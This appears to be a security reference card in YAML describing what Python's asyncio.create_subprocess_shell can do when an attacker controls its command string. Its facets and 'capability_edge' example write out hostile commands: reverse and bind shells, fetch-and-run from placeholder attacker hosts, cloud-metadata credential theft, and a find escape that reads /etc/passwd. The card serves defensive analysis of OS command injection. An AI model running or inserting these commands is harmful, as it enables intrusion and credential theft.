# asyncio.create_subprocess_shell

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-146ad66993383537
api: asyncio.create_subprocess_shell
api_family: asyncio.create_subprocess_shell
runtime:
  language: python
  ecosystem: python-runtime
  package: asyncio
  version: legacy-source-bound
capability_class: process-spawn
normative_authority: capability-facts-only
bound_sinks: []
roles:
- role_id: command
  description: Legacy controlled role command.
  bindings:
  - expression: args
    caller_bindable: true
facets:
- facet_id: legacy-facet-fb42b01a
  capability: 'Execute arbitrary shell commands via the system shell (typically /bin/sh -c on Unix, cmd.exe /c on Windows). The cmd string is passed verbatim to the shell and parsed with full shell grammar: metacharacters, quoting, variable expansion, command substitution, pipelines, redirections, and control operators (;, &&, ||, &) all operate.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-f69cb10b
  capability: 'Chain multiple commands in a single cmd string using shell control operators: `cmd1; cmd2`, `cmd1 && cmd2`, `cmd1 || cmd2`, `cmd1 | cmd2`, background with `&`.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-9b2ff5d7
  capability: 'Perform command substitution inline: `$(...)` and backtick forms are expanded by the shell before the resulting command is executed, enabling data-dependent command construction.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-c434121f
  capability: 'Expand shell variables and environment variables: `${VAR}`, `$VAR`, `${VAR:-default}`, etc., as well as glob patterns (`*`, `?`, `[...]`) and tilde expansion (`~`).'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-cda807d5
  capability: 'Redirect I/O streams: `>`, `>>`, `<`, `2>`, `&>`, `2>&1`, here-documents (`<<EOF`), and here-strings (`<<<`).'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-048f0f04
  capability: Execute shell builtins (echo, read, source/., export, unset, alias, etc.) and flow-control constructs (if/then/else, for/while/until, case, test/[) without needing a binary on disk.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-842f83ab
  capability: Read, create, overwrite, append to, and delete arbitrary files within the process's filesystem permissions, traversing directories accessible to the process.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-43f9941c
  capability: Make outbound TCP/UDP connections to arbitrary hosts and ports via network clients available on the system (curl, wget, nc, python -m http.client, openssl s_client, etc.).
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-b077913f
  capability: 'Establish reverse shells: `bash -i >& /dev/tcp/ATTACKER/4444 0>&1` or equivalents in python, perl, ruby, nc, etc., granting interactive remote access.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-ecf7d6d9
  capability: 'Establish bind shells: `nc -lvp PORT -e /bin/sh` or equivalents, opening a listening port that yields shell access on connect.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-24fb59b1
  capability: Exfiltrate files and data from the filesystem to attacker-controlled servers via curl/wget POST, DNS exfiltration, base64-encoded netcat pipes, scp, etc.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-dfb6d651
  capability: 'Download remote payloads and execute them in-memory or on-disk: `curl -s http://attacker/payload.sh | bash`, `wget -O /tmp/evil http://... && python3 /tmp/evil`, etc.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-1de55cd3
  capability: Execute every binary on the GTFOBins list (find, xargs, awk, tar, git, vim, less, ssh, docker, etc.) with their documented escape-to-shell or file-read/write primitives, regardless of whether the binary was originally intended for code execution.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-9af7a2e3
  capability: Access process substitution (`<(cmd)` / `>(cmd)`) and named pipes (mkfifo) for inter-process communication and data staging.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-156e1295
  capability: Write to files in startup/autostart locations (crontab, systemd user units, .bashrc, .profile, /etc/rc.local, launchd plists) to achieve persistence across reboots and logins.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-47da8558
  capability: Enumerate running processes, inspect /proc (Linux), and send signals (kill, pkill) to other processes.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-044c4cbc
  capability: 'Inspect and traverse the filesystem: ls, find, stat, file, readlink, and glob-based traversal to discover paths, secrets, configuration files, and credential stores.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-654b4f7f
  capability: Execute commands asynchronously via Python's asyncio event loop — callers can run dozens or hundreds of subprocesses concurrently with `asyncio.gather`, enabling parallel brute-force, lateral movement, or mass exploitation.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-4f132fa3
  capability: 'Access cloud metadata services: `curl http://169.254.169.254/latest/meta-data/` (AWS/IMDSv1), Google Cloud metadata, Azure Instance Metadata Service, DigitalOcean metadata, etc., if running in a cloud environment.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-f986eccc
  capability: 'Probe internal network services (SSRF-adjacent): curl/wget/nc to RFC 1918 addresses and localhost, port-scanning with /dev/tcp or nc -z, interacting with internal HTTP APIs and databases.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-fea94e82
  capability: Access the Docker socket (`/var/run/docker.sock`) if mounted, enabling container escape and host compromise via docker exec.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-d582a600
  capability: 'Abuse sudo if the process environment has passwordless sudo or cached credentials: `sudo <any-command>`.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-08350a91
  capability: Set or modify environment variables for child processes via shell export, influencing the behavior of subsequently spawned tools.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-8e0bd026
  capability: 'Use non-HTTP protocols and schemes supported by system tools: file://, gopher://, dict://, ftp://, tftp://, ldap://, etc.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-0480eb96
  capability: 'Redirect following is implicit in download tools (curl -L, wget default): an attacker-controlled URL can redirect to internal addresses, leveraging the subprocess''s network context for SSRF.'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-ef6e0503
  capability: DNS resolution happens at subprocess-creation time, resolved through the inherited system resolver — enables DNS-rebinding and TOCTOU attacks where a domain resolves to different IPs across successive subprocess invocations.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-bb86a1a5
  capability: Capture stdout and stderr into Python memory via asyncio.subprocess.PIPE, enabling the attacker's calling code to read command output programmatically and make data-dependent decisions.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-f5a629bb
  capability: Pipe arbitrary data to stdin of the subprocess via asyncio's StreamWriter, controlling interactive programs and interpreters.
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-089040db
  role_id: null
  value: Inherits the parent process's full environment (os.environ), including PATH, HOME, USER, TMPDIR, and any secrets or credentials present in environment variables.
  security_effect: Inherits the parent process's full environment (os.environ), including PATH, HOME, USER, TMPDIR, and any secrets or credentials present in environment variables.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-7802ac65
  role_id: null
  value: Inherits the parent process's current working directory (os.getcwd()), which may contain sensitive files, configuration, or be a mounted volume with broader access.
  security_effect: Inherits the parent process's current working directory (os.getcwd()), which may contain sensitive files, configuration, or be a mounted volume with broader access.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-1230f15e
  role_id: null
  value: Inherits the parent process's file descriptors unless explicitly closed via close_fds or the subprocess explicitly redirects them.
  security_effect: Inherits the parent process's file descriptors unless explicitly closed via close_fds or the subprocess explicitly redirects them.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-0cfde5ce
  role_id: null
  value: 'Uses the system default shell: /bin/sh on Unix (which on many distributions is bash, dash, or similar), cmd.exe on Windows. The shell is selected by the C runtime, not by Python, and cannot be changed via the cmd parameter alone.'
  security_effect: 'Uses the system default shell: /bin/sh on Unix (which on many distributions is bash, dash, or similar), cmd.exe on Windows. The shell is selected by the C runtime, not by Python, and cannot be changed via the cmd parameter alone.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-9f1af1ae
  role_id: null
  value: By default does NOT allocate a pseudo-terminal (PTY); I/O is piped. Interactive features like password prompts, editors, and job control may behave differently than in a TTY session.
  security_effect: By default does NOT allocate a pseudo-terminal (PTY); I/O is piped. Interactive features like password prompts, editors, and job control may behave differently than in a TTY session.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-4263edf7
  role_id: null
  value: The limit parameter defaults to 65536 bytes per-pipe buffer (asyncio StreamReader default); larger output silently truncates unless the caller configures a higher limit.
  security_effect: The limit parameter defaults to 65536 bytes per-pipe buffer (asyncio StreamReader default); larger output silently truncates unless the caller configures a higher limit.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-98ae538b
  role_id: null
  value: On Windows, subprocess support requires a ProactorEventLoop; the default SelectorEventLoop does not support subprocesses on that platform.
  security_effect: On Windows, subprocess support requires a ProactorEventLoop; the default SelectorEventLoop does not support subprocesses on that platform.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-bcb4867e
  role_id: null
  value: Garbage collection of the Process object while the subprocess is running triggers SIGKILL (Unix) / TerminateProcess (Windows) on the child, which can be used to hide long-running commands.
  security_effect: Garbage collection of the Process object while the subprocess is running triggers SIGKILL (Unix) / TerminateProcess (Windows) on the child, which can be used to hide long-running commands.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: "import asyncio\n\nasync def run(cmd):\n    proc = await asyncio.create_subprocess_shell(\n        cmd,\n        stdout=asyncio.subprocess.PIPE,\n        stderr=asyncio.subprocess.PIPE,\n    )\n    stdout, stderr = await proc.communicate()\n    return proc.returncode, stdout.decode(), stderr.decode()\n\n# Benign: list a directory\ncode, out, err = asyncio.run(run(\"ls -la /tmp\"))\nprint(f\"exit={code}\\nstdout={out}\")\n"
  capability_edge: "import asyncio\n\n# Attacker controls the cmd string: full shell grammar available\nPAYLOAD = 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n\nasync def edge(cmd):\n    proc = await asyncio.create_subprocess_shell(\n        cmd,\n        stdout=asyncio.subprocess.PIPE,\n        stderr=asyncio.subprocess.STDOUT,\n    )\n    stdout, _ = await proc.communicate()\n    return stdout.decode()\n\nasyncio.run(edge(PAYLOAD))\n\n# Also: chain through GTFOBins binaries\nasyncio.run(edge('find . -exec /bin/sh -c \"id; cat /etc/passwd\" \\\\;'))\n\n# Also: concurrent mass exploitation\nTARGETS = [f\"curl -s http://{ip}:8080/exec?cmd=id\" for ip in [\"10.0.0.1\", \"10.0.0.2\", \"10.0.0.3\"]]\nresults = asyncio.run(asyncio.gather(*[edge(cmd) for cmd in TARGETS]))\n"
provenance:
- '{''Official CPython docs'': ''https://docs.python.org/3/library/asyncio-subprocess.html#asyncio.create_subprocess_shell''}'
- '{''GTFOBins reference for shell-escape primitives'': ''https://gtfobins.github.io/''}'
- '{''CWE-78'': "Improper Neutralization of Special Elements used in an OS Command (''OS Command Injection'')"}'
- '{''CPython asyncio source'': "Lib/asyncio/subprocess.py (create_subprocess_shell delegates to loop.subprocess_shell which calls subprocess.Popen with shell=True on the event loop''s executor)"}'
```
